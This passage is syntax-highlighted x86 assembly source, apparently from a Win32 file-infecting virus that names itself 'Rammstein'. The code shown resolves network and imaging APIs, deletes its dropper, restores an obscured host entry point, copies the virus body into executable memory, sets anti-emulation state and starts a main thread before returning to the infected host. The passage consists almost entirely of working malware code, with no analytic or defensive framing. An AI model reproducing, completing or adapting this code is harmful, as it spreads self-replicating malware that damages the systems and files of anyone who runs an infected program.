       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdi32apis</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdi32addr</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">gdi32func</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApis</span><span class="sc0">                             </span><span class="sc1">;and it's apis</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mpr32_name</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;locate mpr32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NoNetworkApis</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mpr32apis</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mpr32addr</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mpr32func</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApis</span><span class="sc0">                             </span><span class="sc1">;and it's apis</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NoNetworkApis</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">netapis</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_img</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NoNetworkApis</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">netapis</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_img</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">img32_name</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;locate and save</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">;the checksum procedure</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_image</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@checksum</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CheckSumMappedFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@checksum</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checksumfile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_image</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">module_names</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;recrypt names</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">module_names_length</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">VIRUSNOTIFYENTRY</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">entrytext1</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rammstein viral code start!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">entrytext1</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">entrytext2</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rammstein viral code start!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">entrytext2</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MessageBoxA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">smash_dropper</span><span class="sc0">                          </span><span class="sc1">;kill dropper</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getversion</span><span class="sc0">                             </span><span class="sc1">;get the windoze version</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WindowsVersion</span><span class="sc0"> </span><span class="sc5">OSVERSIONINFOA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OSVERSIONINFOA</span><span class="sc4">&gt;</span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getversion</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetVersionExA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">version</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skipper</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MMX</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushfd</span><span class="sc0">                                      </span><span class="sc1">;push flags</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;get flags</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                 </span><span class="sc1">;test for mmx presence</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">no_mmx_present</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mmx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                         </span><span class="sc1">;set it!</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_mmx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_mmx_present</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mmx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_mmx</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">JUMP</span><span class="sc0">                                     </span><span class="sc1">;allocate some more</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_MOVE_CODE</span><span class="sc0">          </span><span class="sc1">;if code is not moved</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">restore_epo</span><span class="sc0">                             </span><span class="sc1">;skip memory jump</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_VirtualAlloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc4">+</span><span class="sc5">MEM_RESERVE</span><span class="sc4">,\
</span><span class="sc0">                                 </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;memory</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_memory_error</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fatalexit</span><span class="sc0">                              </span><span class="sc1">;we cannot continue...</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Not enough memory!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fatalexit</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;if an error occurs, then</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;simulate a fatal exit</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FatalAppExitA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_memory_error</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">memory</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;otherwise copy the</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;virus to memory and</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">resident_area</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;continue there...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_epo</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">EPO</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofentrypoint</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;restore epo</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">saved_code</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">resident_area</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdelta2</span><span class="sc0">                              </span><span class="sc1">;get delta again...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getdelta2</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta2</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">ANTIEMU</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">grunge</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_MOVE_CODE</span><span class="sc0">          </span><span class="sc1">;check the method</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">second_method</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesource</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;if here, we must move</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codedestin</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;some code back to where</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;it belongs...</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">second_method</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">grunge</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MAINTHREAD</span><span class="sc0">                               </span><span class="sc1">;now we launch the main</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mainthreadid</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;thread</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MainThread</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;if it is the first gen</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">do_return</span><span class="sc0">                               </span><span class="sc1">;than wait for it to</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WaitForSingleObject</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFINITE</span><span class="sc0"> </span><span class="sc1">;finish</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_return</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;otherwise, return to host</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                            </span><span class="sc1">;here...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">MainThread</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@MainThreadDelta</span><span class="sc0">                       </span><span class="sc1">;for our main thread get</span><span class="sc0">
</span><span class="sc5">@MainThreadDelta</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;the delta handle again</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@MainThreadDelta</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MAINTHREADSEH</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MainExceptionExit</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
